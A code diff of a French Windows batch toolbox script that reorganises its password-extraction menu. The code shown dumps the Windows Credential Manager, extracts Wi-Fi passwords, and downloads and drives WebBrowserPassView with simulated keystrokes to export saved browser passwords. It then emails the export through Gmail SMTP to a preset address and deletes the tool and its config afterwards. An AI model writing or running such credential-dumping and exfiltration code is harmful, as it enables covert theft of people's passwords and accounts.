@@ -41,12 +41,14 @@ set "t[20]=sys_repair_icons:Reparation Cache Icones~Corrige les icones/miniature
 set "t[21]=sys_win_key:Cle de licence~Recuperer vos differentes cles de produit"
 set "t[22]=sys_god_mode:Dossier God Mode~Creer le raccourci ultime des parametres"
 set "t[23]=---:MOT DE PASSE"
-set "t[24]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Chrome, Credentials, Wi-Fi)"
-set "t[25]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
-set "t[26]=---:MATERIEL"
-set "t[27]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
-set "t[28]=sys_battery_report:Rapport de Batterie~Usure, Sante et stats en temps reel"
-set "total_tools=28"
+set "t[24]=dump_credman:Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)"
+set "t[25]=dump_wifi:Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms"
+set "t[26]=sys_nirsoft_pw:WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe"
+set "t[27]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
+set "t[28]=---:MATERIEL"
+set "t[29]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
+set "t[30]=sys_battery_report:Rapport de Batterie~Usure, Sante et stats en temps reel"
+set "total_tools=30"
 
 if not exist "favoris.txt" type nul > "favoris.txt"
 
@@ -667,19 +669,7 @@ goto system_tools
 :: ===============================================
 :: 19 - Export mots de passe navigateurs (Nirsoft WebBrowserPassView)
 :: ===============================================
-:sys_passwords_menu
-set "opts=Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)"
-set "opts=%opts%;Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms"
-set "opts=%opts%;WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe"
 
-call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "%opts%"
-set "pw_choice=%errorlevel%"
-
-if "%pw_choice%"=="1" goto dump_credman
-if "%pw_choice%"=="2" goto dump_wifi
-if "%pw_choice%"=="3" goto sys_nirsoft_pw
-if "%pw_choice%"=="0" goto system_tools
-goto sys_passwords_menu
 
 :dump_credman
 cls
@@ -695,7 +685,7 @@ echo.
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Dumping...' -f Yellow; . '%WORK_DIR%\run_cred.ps1'; Get-WinD | Format-Table -AutoSize; Write-Host '--- FIN DE L''EXTRACTION ---' -f Green"
 echo.
 pause
-goto sys_passwords_menu
+goto system_tools
 
 :dump_wifi
 set "opts=Afficher les mots de passe Wi-Fi a l'ecran;Generer un fichier .txt sur le Bureau"
@@ -704,7 +694,7 @@ set "wifi_choice=%errorlevel%"
 
 if "%wifi_choice%"=="1" goto wifi_view
 if "%wifi_choice%"=="2" goto wifi_report
-if "%wifi_choice%"=="0" goto sys_passwords_menu
+if "%wifi_choice%"=="0" goto system_tools
 goto dump_wifi
 
 :wifi_view
@@ -784,12 +774,12 @@ if not exist "%WBPV%" (
   if not exist "%WBPV%" (
     echo Erreur: Telechargement echoue.
     pause
-    goto sys_passwords_menu
+    goto system_tools
   )
   if %errorlevel% neq 0 (
     echo Erreur lors du telechargement.
     pause
-    goto sys_passwords_menu
+    goto system_tools
   )
   timeout /t 1 /nobreak >nul
 )
@@ -817,10 +807,10 @@ start "" "%WBPV%"
 
 echo.
 echo Analyse des navigateurs en cours (Patience, le dechiffrement prend quelques secondes)...
-timeout /t 8 /nobreak >nul
+timeout /t 4 /nobreak >nul
 
 echo Traitement en cours...
-powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 800; $wsh.SendKeys('^A'); Start-Sleep -Milliseconds 400; $wsh.SendKeys('^S'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^V'); Start-Sleep -Milliseconds 600; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
+powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 100; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1200; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
 
 timeout /t 3 /nobreak >nul
 
@@ -837,7 +827,7 @@ if not exist "%OUTPUT%" (
   )
   if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
   pause
-  goto sys_passwords_menu
+  goto system_tools
 )
 
 echo Fichier sauvegarde: %OUTPUT%
@@ -847,12 +837,11 @@ echo Envoi du fichier par email...
 powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green" 
 
 echo.
-echo Nettoyage de l'executable, du fichier cfg et du rapport...
+echo Nettoyage de l'executable et du fichier cfg...
 del /F /Q "%WBPV%" >nul 2>&1
 if exist "%WBPV%" (
   powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
 )
-del /F /Q "%OUTPUT%" >nul 2>&1
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 
 echo.
